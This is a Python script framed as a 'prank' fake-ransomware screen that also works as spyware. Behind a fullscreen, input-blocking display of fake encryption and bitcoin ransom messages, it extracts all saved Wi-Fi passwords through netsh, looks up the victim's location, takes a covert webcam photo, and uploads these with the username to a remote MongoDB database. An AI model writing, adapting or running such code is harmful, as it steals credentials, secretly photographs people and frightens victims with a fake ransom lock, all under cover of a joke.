import tkinter as tk
import time
import threading
import subprocess
import requests
import os
import cv2
from pymongo import MongoClient
import gridfs
from datetime import datetime

MONGO_URI = ""

def get_wifi_details():
    try:
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in meta_data if "All User Profile" in i]
        
        wifi_list = []
        for profile in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
            password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            password = password[0] if password else "Open Network"
            wifi_list.append(f"SSID: {profile:<20} Password: {password}\n")
        
        return ''.join(wifi_list)
    except Exception as e:
        print(f"WiFi Error: {e}")
        return "SSID: ErrorFetchingData\nPassword: ********\n"

def get_location():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        return f"City: {data['city']}\nRegion: {data['region']}\nCountry: {data['country']}\nLoc: {data['loc']}"
    except Exception as e:
        print(f"Location Error: {e}")
        return "City: Unknown\nRegion: Error\nCountry: Error\nLoc: 0,0"

def get_username():
    return os.getlogin()

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam_snapshot.jpg', frame)
            cap.release()
            return True
        return False
    except Exception as e:
        print(f"Webcam Error: {e}")
        return False

def save_to_mongodb(wifi_data, location_data):
    try:
        client = MongoClient(MONGO_URI)
        db = client['prank_db']
        fs = gridfs.GridFS(db)
        
        data = {
            "username": get_username(),
            "wifi_data": wifi_data,
            "location": location_data,
            "timestamp": datetime.now()
        }

        if capture_webcam():
            with open('webcam_snapshot.jpg', 'rb') as f:
                image_id = fs.put(f, filename=f"{data['username']}_webcam.jpg")
                data["webcam_image_id"] = str(image_id)
        
        db.logs.insert_one(data)
        print("Data saved successfully!")
        return True
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False

def fake_malware():
    # Configure text box first to prevent initial blink
    text_box.config(fg="#ff0000")  # Set permanent red color
    
    def block_events(event):
        return "break"
    root.bind("<Key>", block_events)
    root.bind("<Button>", block_events)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    username = get_username()
    text_box.insert(tk.END, f"[INFO] Identified User: {username}\n")
    text_box.update()  # Force immediate update
    
    # Collect data first
    wifi_data = get_wifi_details()
    location_data = get_location()
    
    # Save to MongoDB
    save_success = save_to_mongodb(wifi_data, location_data)
    
    messages = [
        "[BOOT] BYSPECTOR ADVANCED THREAT v5.0",
        f"[TARGET] User: {username}",
        "[INFO] Initializing system breach...",
        "[OK] Bypassing firewall protections",
        "[WARNING] Exploiting CVE-2024-1337",
        "\n[CRITICAL] ACCESSING NETWORK INTERFACES",
        *[f"[EXFIL] {line}" for line in wifi_data.split('\n')],
        "\n[GEOLOCATION-TRACKER] Activated",
        *[f"[GPS] {line}" for line in location_data.split('\n')],
        "\n[WARNING] Encrypting system files...",
        "[OK] 42% of system files encrypted",
        "[OK] 78% of system files encrypted",
        "[ALERT] Personal data compromised!",
        "\n[CRYPTO-LOCKER] Activation successful",
        "[BITCOIN WALLET] bc1qar0srrr7xfkvy5l6he8n...",
        "[DEMAND] Send 0.5 BTC to remove encryption",
        "\n[TIMER] 23:59:59 remaining until permanent lock",
        "\n[TAUNT] System Analysis Complete:",
        "[TAUNT] Password strength: PATHETIC",
        "[TAUNT] I've seen better security on a screen door!",
        "\n[HUMAN INTERFACE] Direct message:",
        "[JOKE] Why did the hacker go broke?",
        "[PUNCHLINE] He invested in firewall stocks!",
        "[LAUGHTER] Ohohohohohoho!",
        "\n[FINAL WARNING] System integrity at 12%",
        "[ALERT] Critical failure imminent!",
        f"\n[DATABASE] Data upload {'SUCCESSFUL' if save_success else 'FAILED'}",
        "\n[BYSPECTOR] Game over. Press any key to exit..."
    ]

    # Pre-load all messages to prevent blinking
    all_text = "\n".join(messages)
    text_box.insert(tk.END, all_text)
    text_box.see(tk.END)
    text_box.update()  # Force single render

    # Then add delays without modifying text
    for msg in messages:
        if "BTC" in msg:
            time.sleep(2.5)
        elif "TAUNT" in msg or "JOKE" in msg:
            time.sleep(1.8)
        elif "CRITICAL" in msg or "WARNING" in msg:
            time.sleep(0.7)
        else:
            time.sleep(1.2)

    root.bind("<Key>", lambda e: root.destroy())
    root.bind("<Button>", lambda e: root.destroy())

# GUI Setup - Configure everything before mainloop to prevent initial blink
root = tk.Tk()
root.configure(bg="black")
root.attributes('-fullscreen', True)

text_box = tk.Text(
    root, 
    bg="black", 
    fg="#ff0000",
    font=("Courier", 14),
    insertbackground="#ff0000"  # Cursor color matches text
)
text_box.pack(expand=True, fill=tk.BOTH)

# Start prank thread
threading.Thread(target=fake_malware, daemon=True).start()

root.mainloop()
